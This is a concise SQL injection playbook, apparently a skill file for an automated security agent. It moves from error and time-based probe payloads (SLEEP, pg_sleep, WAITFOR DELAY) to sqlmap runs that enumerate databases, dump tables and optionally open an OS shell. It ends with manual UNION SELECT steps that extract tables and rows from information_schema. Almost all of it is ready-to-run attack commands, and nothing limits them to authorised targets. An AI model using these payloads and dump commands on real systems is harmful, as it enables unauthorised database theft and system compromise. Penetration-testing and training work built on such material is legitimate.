---
id: sqli-basic
title: SQL injection — detection → union extraction → blind fallback
triggers: [sqlmap, ' or ', union select, mysql, sqlite, syntax error]
---

## Detection — cheap probes before the scanner

- `'`, `"`, `')`, `' OR '1'='1` into ONE parameter at a time — a 500 or a
  `syntax error near` / `mysql_fetch` in the body is a live signal. A
  changed result count (auth bypass works, empty page errors) counts too.
- `-H 'Cookie: session=…'` — don't forget cookies/auth headers when the
  injectable param sits behind login.
- Time-based proof beats error noise: `' AND SLEEP(3)-- -` (MySQL),
  `'; SELECT pg_sleep(3)-- -` (Postgres), `'; WAITFOR DELAY '0:0:3'-- -`
  (MSSQL) — a 3s+ delay is confirmation without needing output.

## sqlmap — when the probe is positive

```bash
sqlmap -u 'http://TARGET/page?id=1' --batch --level=2 --risk=1 \
       --dbs --threads=4
sqlmap -u '…' --batch -D <db> --tables
sqlmap -u '…' --batch -D <db> -T <t> --dump
# behind login: --cookie='PHPSESSID=…' ; POST body: --data='u=x&p=y' -p u
```

- `--batch` is mandatory for unattended runs — interactive prompts hang
  the pane forever.
- `--forms` on a URL with no params; `--os-shell` only when the task
  explicitly calls for shell access (write-heavy, loud).

## Manual union path (sqlmap unavailable or too loud)

1. Column count: `' ORDER BY 1-- -`, `ORDER BY 2-- -`, … until error →
   count = last working number.
2. `' UNION SELECT NULL,NULL-- -` with that many NULLs → find which
   position reflects into the page (`SELECT 1,2,3` shows the slot).
3. `UNION SELECT table_name,NULL FROM information_schema.tables-- -`
   → then columns, then the juicy table's rows.
